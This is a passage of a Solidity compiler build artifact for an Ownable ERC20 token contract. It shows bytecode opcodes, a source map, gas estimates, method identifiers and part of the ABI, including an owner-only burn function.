0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD PUSH2 0xD64 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xDAB JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xD90 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xDD3 DUP3 PUSH2 0xD71 JUMP JUMPDEST PUSH2 0xDDD DUP2 DUP6 PUSH2 0xD7C JUMP JUMPDEST SWAP4 POP PUSH2 0xDED DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xD8D JUMP JUMPDEST PUSH2 0xDF6 DUP2 PUSH2 0xDB7 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xE1B DUP2 DUP5 PUSH2 0xDC8 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE53 DUP3 PUSH2 0xE28 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE63 DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP2 EQ PUSH2 0xE6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xE80 DUP2 PUSH2 0xE5A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE99 DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP2 EQ PUSH2 0xEA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xEB6 DUP2 PUSH2 0xE90 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xED3 JUMPI PUSH2 0xED2 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xEE1 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0xEF2 DUP6 DUP3 DUP7 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF11 DUP2 PUSH2 0xEFC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF2C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF08 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xF3B DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF56 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xF75 JUMPI PUSH2 0xF74 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF83 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0xF94 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0xFA5 DUP7 DUP3 DUP8 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFC5 DUP2 PUSH2 0xFAF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xFE0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xFBC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFFC JUMPI PUSH2 0xFFB PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x100A DUP5 DUP3 DUP6 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x101C DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1037 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1013 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1054 JUMPI PUSH2 0x1053 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1062 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1073 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x10C4 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x10D7 JUMPI PUSH2 0x10D6 PUSH2 0x107D JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1117 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x1122 DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0x1130 DUP2 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0x1147 JUMPI PUSH2 0x1146 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1163 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x1013 JUMP JUMPDEST PUSH2 0x1170 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0xF32 JUMP JUMPDEST PUSH2 0x117D PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1190 DUP3 PUSH2 0xE86 JUMP JUMPDEST SWAP2 POP PUSH2 0x119B DUP4 PUSH2 0xE86 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x11B3 JUMPI PUSH2 0x11B2 PUSH2 0x10DD JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDA PUSH5 0x986EFE334F CREATE2 DUP4 PUSH28 0x986DB8A789595EF8A676806085E4AC809B5C5513312F64736F6C6343 STOP ADDMOD ISZERO STOP CALLER ","sourceMap":"220:427:8:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2074:89:2;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;4293:186;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;3144:97;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;5039:244;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;3002:82;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;3299:116;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2293:101:0;;;:::i;:::-;;1638:85;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2276:93:2;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;531:114:8;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;3610:178:2;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;3846:140;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2543:215:0;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;2074:89:2;2119:13;2151:5;2144:12;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2074:89;:::o;4293:186::-;4366:4;4382:13;4398:12;:10;:12::i;:::-;4382:28;;4420:31;4429:5;4436:7;4445:5;4420:8;:31::i;:::-;4468:4;4461:11;;;4293:186;;;;:::o;3144:97::-;3196:7;3222:12;;3215:19;;3144:97;:::o;5039:244::-;5126:4;5142:15;5160:12;:10;:12::i;:::-;5142:30;;5182:37;5198:4;5204:7;5213:5;5182:15;:37::i;:::-;5229:26;5239:4;5245:2;5249:5;5229:9;:26::i;:::-;5272:4;5265:11;;;5039:244;;;;;:::o;3002:82::-;3051:5;3075:2;3068:9;;3002:82;:::o;3299:116::-;3364:7;3390:9;:18;3400:7;3390:18;;;;;;;;;;;;;;;;3383:25;;3299:116;;;:::o;2293:101:0:-;1531:13;:11;:13::i;:::-;2357:30:::1;2384:1;2357:18;:30::i;:::-;2293:101::o:0;1638:85::-;1684:7;1710:6;;;;;;;;;;;1703:13;;1638:85;:::o;2276:93:2:-;2323:13;2355:7;2348:14;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2276:93;:::o;531:114:8:-;1531:13:0;:11;:13::i;:::-;605:33:8::1;611:7;629:8;620:6;:17;;;;:::i;:::-;605:5;:33::i;:::-;531:114:::0;;:::o;3610:178:2:-;3679:4;3695:13;3711:12;:10;:12::i;:::-;3695:28;;3733:27;3743:5;3750:2;3754:5;3733:9;:27::i;:::-;3777:4;3770:11;;;3610:178;;;;:::o;3846:140::-;3926:7;3952:11;:18;3964:5;3952:18;;;;;;;;;;;;;;;:27;3971:7;3952:27;;;;;;;;;;;;;;;;3945:34;;3846:140;;;;:::o;2543:215:0:-;1531:13;:11;:13::i;:::-;2647:1:::1;2627:22;;:8;:22;;::::0;2623:91:::1;;2700:1;2672:31;;;;;;;;;;;:::i;:::-;;;;;;;;2623:91;2723:28;2742:8;2723:18;:28::i;:::-;2543:215:::0;:::o;656:96:5:-;709:7;735:10;728:17;;656:96;:::o;8989:128:2:-;9073:37;9082:5;9089:7;9098:5;9105:4;9073:8;:37::i;:::-;8989:128;;;:::o;10663:477::-;10762:24;10789:25;10799:5;10806:7;10789:9;:25::i;:::-;10762:52;;10848:17;10828:16;:37;10824:310;;10904:5;10885:16;:24;10881:130;;;10963:7;10972:16;10990:5;10936:60;;;;;;;;;;;;;:::i;:::-;;;;;;;;10881:130;11052:57;11061:5;11068:7;11096:5;11077:16;:24;11103:5;11052:8;:57::i;:::-;10824:310;10752:388;10663:477;;;:::o;5656:300::-;5755:1;5739:18;;:4;:18;;;5735:86;;5807:1;5780:30;;;;;;;;;;;:::i;:::-;;;;;;;;5735:86;5848:1;5834:16;;:2;:16;;;5830:86;;5902:1;5873:32;;;;;;;;;;;:::i;:::-;;;;;;;;5830:86;5925:24;5933:4;5939:2;5943:5;5925:7;:24::i;:::-;5656:300;;;:::o;1796:162:0:-;1866:12;:10;:12::i;:::-;1855:23;;:7;:5;:7::i;:::-;:23;;;1851:101;;1928:12;:10;:12::i;:::-;1901:40;;;;;;;;;;;:::i;:::-;;;;;;;;1851:101;1796:162::o;2912:187::-;2985:16;3004:6;;;;;;;;;;;2985:25;;3029:8;3020:6;;:17;;;;;;;;;;;;;;;;;;3083:8;3052:40;;3073:8;3052:40;;;;;;;;;;;;2975:124;2912:187;:::o;8247:206:2:-;8336:1;8317:21;;:7;:21;;;8313:89;;8388:1;8361:30;;;;;;;;;;;:::i;:::-;;;;;;;;8313:89;8411:35;8419:7;8436:1;8440:5;8411:7;:35::i;:::-;8247:206;;:::o;9949:432::-;10078:1;10061:19;;:5;:19;;;10057:89;;10132:1;10103:32;;;;;;;;;;;:::i;:::-;;;;;;;;10057:89;10178:1;10159:21;;:7;:21;;;10155:90;;10231:1;10203:31;;;;;;;;;;;:::i;:::-;;;;;;;;10155:90;10284:5;10254:11;:18;10266:5;10254:18;;;;;;;;;;;;;;;:27;10273:7;10254:27;;;;;;;;;;;;;;;:35;;;;10303:9;10299:76;;;10349:7;10333:31;;10342:5;10333:31;;;10358:5;10333:31;;;;;;:::i;:::-;;;;;;;;10299:76;9949:432;;;;:::o;6271:1107::-;6376:1;6360:18;;:4;:18;;;6356:540;;6512:5;6496:12;;:21;;;;;;;:::i;:::-;;;;;;;;6356:540;;;6548:19;6570:9;:15;6580:4;6570:15;;;;;;;;;;;;;;;;6548:37;;6617:5;6603:11;:19;6599:115;;;6674:4;6680:11;6693:5;6649:50;;;;;;;;;;;;;:::i;:::-;;;;;;;;6599:115;6866:5;6852:11;:19;6834:9;:15;6844:4;6834:15;;;;;;;;;;;;;;;:37;;;;6534:362;6356:540;6924:1;6910:16;;:2;:16;;;6906:425;;7089:5;7073:12;;:21;;;;;;;;;;;6906:425;;;7301:5;7284:9;:13;7294:2;7284:13;;;;;;;;;;;;;;;;:22;;;;;;;;;;;6906:425;7361:2;7346:25;;7355:4;7346:25;;;7365:5;7346:25;;;;;;:::i;:::-;;;;;;;;6271:1107;;;:::o;7:99:10:-;59:6;93:5;87:12;77:22;;7:99;;;:::o;112:169::-;196:11;230:6;225:3;218:19;270:4;265:3;261:14;246:29;;112:169;;;;:::o;287:246::-;368:1;378:113;392:6;389:1;386:13;378:113;;;477:1;472:3;468:11;462:18;458:1;453:3;449:11;442:39;414:2;411:1;407:10;402:15;;378:113;;;525:1;516:6;511:3;507:16;500:27;349:184;287:246;;;:::o;539:102::-;580:6;631:2;627:7;622:2;615:5;611:14;607:28;597:38;;539:102;;;:::o;647:377::-;735:3;763:39;796:5;763:39;:::i;:::-;818:71;882:6;877:3;818:71;:::i;:::-;811:78;;898:65;956:6;951:3;944:4;937:5;933:16;898:65;:::i;:::-;988:29;1010:6;988:29;:::i;:::-;983:3;979:39;972:46;;739:285;647:377;;;;:::o;1030:313::-;1143:4;1181:2;1170:9;1166:18;1158:26;;1230:9;1224:4;1220:20;1216:1;1205:9;1201:17;1194:47;1258:78;1331:4;1322:6;1258:78;:::i;:::-;1250:86;;1030:313;;;;:::o;1430:117::-;1539:1;1536;1529:12;1676:126;1713:7;1753:42;1746:5;1742:54;1731:65;;1676:126;;;:::o;1808:96::-;1845:7;1874:24;1892:5;1874:24;:::i;:::-;1863:35;;1808:96;;;:::o;1910:122::-;1983:24;2001:5;1983:24;:::i;:::-;1976:5;1973:35;1963:63;;2022:1;2019;2012:12;1963:63;1910:122;:::o;2038:139::-;2084:5;2122:6;2109:20;2100:29;;2138:33;2165:5;2138:33;:::i;:::-;2038:139;;;;:::o;2183:77::-;2220:7;2249:5;2238:16;;2183:77;;;:::o;2266:122::-;2339:24;2357:5;2339:24;:::i;:::-;2332:5;2329:35;2319:63;;2378:1;2375;2368:12;2319:63;2266:122;:::o;2394:139::-;2440:5;2478:6;2465:20;2456:29;;2494:33;2521:5;2494:33;:::i;:::-;2394:139;;;;:::o;2539:474::-;2607:6;2615;2664:2;2652:9;2643:7;2639:23;2635:32;2632:119;;;2670:79;;:::i;:::-;2632:119;2790:1;2815:53;2860:7;2851:6;2840:9;2836:22;2815:53;:::i;:::-;2805:63;;2761:117;2917:2;2943:53;2988:7;2979:6;2968:9;2964:22;2943:53;:::i;:::-;2933:63;;2888:118;2539:474;;;;;:::o;3019:90::-;3053:7;3096:5;3089:13;3082:21;3071:32;;3019:90;;;:::o;3115:109::-;3196:21;3211:5;3196:21;:::i;:::-;3191:3;3184:34;3115:109;;:::o;3230:210::-;3317:4;3355:2;3344:9;3340:18;3332:26;;3368:65;3430:1;3419:9;3415:17;3406:6;3368:65;:::i;:::-;3230:210;;;;:::o;3446:118::-;3533:24;3551:5;3533:24;:::i;:::-;3528:3;3521:37;3446:118;;:::o;3570:222::-;3663:4;3701:2;3690:9;3686:18;3678:26;;3714:71;3782:1;3771:9;3767:17;3758:6;3714:71;:::i;:::-;3570:222;;;;:::o;3798:619::-;3875:6;3883;3891;3940:2;3928:9;3919:7;3915:23;3911:32;3908:119;;;3946:79;;:::i;:::-;3908:119;4066:1;4091:53;4136:7;4127:6;4116:9;4112:22;4091:53;:::i;:::-;4081:63;;4037:117;4193:2;4219:53;4264:7;4255:6;4244:9;4240:22;4219:53;:::i;:::-;4209:63;;4164:118;4321:2;4347:53;4392:7;4383:6;4372:9;4368:22;4347:53;:::i;:::-;4337:63;;4292:118;3798:619;;;;;:::o;4423:86::-;4458:7;4498:4;4491:5;4487:16;4476:27;;4423:86;;;:::o;4515:112::-;4598:22;4614:5;4598:22;:::i;:::-;4593:3;4586:35;4515:112;;:::o;4633:214::-;4722:4;4760:2;4749:9;4745:18;4737:26;;4773:67;4837:1;4826:9;4822:17;4813:6;4773:67;:::i;:::-;4633:214;;;;:::o;4853:329::-;4912:6;4961:2;4949:9;4940:7;4936:23;4932:32;4929:119;;;4967:79;;:::i;:::-;4929:119;5087:1;5112:53;5157:7;5148:6;5137:9;5133:22;5112:53;:::i;:::-;5102:63;;5058:117;4853:329;;;;:::o;5188:118::-;5275:24;5293:5;5275:24;:::i;:::-;5270:3;5263:37;5188:118;;:::o;5312:222::-;5405:4;5443:2;5432:9;5428:18;5420:26;;5456:71;5524:1;5513:9;5509:17;5500:6;5456:71;:::i;:::-;5312:222;;;;:::o;5540:474::-;5608:6;5616;5665:2;5653:9;5644:7;5640:23;5636:32;5633:119;;;5671:79;;:::i;:::-;5633:119;5791:1;5816:53;5861:7;5852:6;5841:9;5837:22;5816:53;:::i;:::-;5806:63;;5762:117;5918:2;5944:53;5989:7;5980:6;5969:9;5965:22;5944:53;:::i;:::-;5934:63;;5889:118;5540:474;;;;;:::o;6020:180::-;6068:77;6065:1;6058:88;6165:4;6162:1;6155:15;6189:4;6186:1;6179:15;6206:320;6250:6;6287:1;6281:4;6277:12;6267:22;;6334:1;6328:4;6324:12;6355:18;6345:81;;6411:4;6403:6;6399:17;6389:27;;6345:81;6473:2;6465:6;6462:14;6442:18;6439:38;6436:84;;6492:18;;:::i;:::-;6436:84;6257:269;6206:320;;;:::o;6532:180::-;6580:77;6577:1;6570:88;6677:4;6674:1;6667:15;6701:4;6698:1;6691:15;6718:410;6758:7;6781:20;6799:1;6781:20;:::i;:::-;6776:25;;6815:20;6833:1;6815:20;:::i;:::-;6810:25;;6870:1;6867;6863:9;6892:30;6910:11;6892:30;:::i;:::-;6881:41;;7071:1;7062:7;7058:15;7055:1;7052:22;7032:1;7025:9;7005:83;6982:139;;7101:18;;:::i;:::-;6982:139;6766:362;6718:410;;;;:::o;7134:442::-;7283:4;7321:2;7310:9;7306:18;7298:26;;7334:71;7402:1;7391:9;7387:17;7378:6;7334:71;:::i;:::-;7415:72;7483:2;7472:9;7468:18;7459:6;7415:72;:::i;:::-;7497;7565:2;7554:9;7550:18;7541:6;7497:72;:::i;:::-;7134:442;;;;;;:::o;7582:191::-;7622:3;7641:20;7659:1;7641:20;:::i;:::-;7636:25;;7675:20;7693:1;7675:20;:::i;:::-;7670:25;;7718:1;7715;7711:9;7704:16;;7739:3;7736:1;7733:10;7730:36;;;7746:18;;:::i;:::-;7730:36;7582:191;;;;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"918200","executionCost":"infinite","totalCost":"infinite"},"external":{"allowance(address,address)":"infinite","approve(address,uint256)":"infinite","balanceOf(address)":"2952","burn(address,uint256)":"infinite","decimals()":"432","name()":"infinite","owner()":"2567","renounceOwnership()":"infinite","symbol()":"infinite","totalSupply()":"2482","transfer(address,uint256)":"infinite","transferFrom(address,address,uint256)":"infinite","transferOwnership(address)":"infinite"}},"methodIdentifiers":{"allowance(address,address)":"dd62ed3e","approve(address,uint256)":"095ea7b3","balanceOf(address)":"70a08231","burn(address,uint256)":"9dc29fac","decimals()":"313ce567","name()":"06fdde03","owner()":"8da5cb5b","renounceOwnership()":"715018a6","symbol()":"95d89b41","totalSupply()":"18160ddd","transfer(address,uint256)":"a9059cbb","transferFrom(address,address,uint256)":"23b872dd","transferOwnership(address)":"f2fde38b"}},"metadata":"{\"compiler\":{\"version\":\"0.8.21+commit.d9974bed\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"initialSupply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"contractAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSpender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"i_owner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"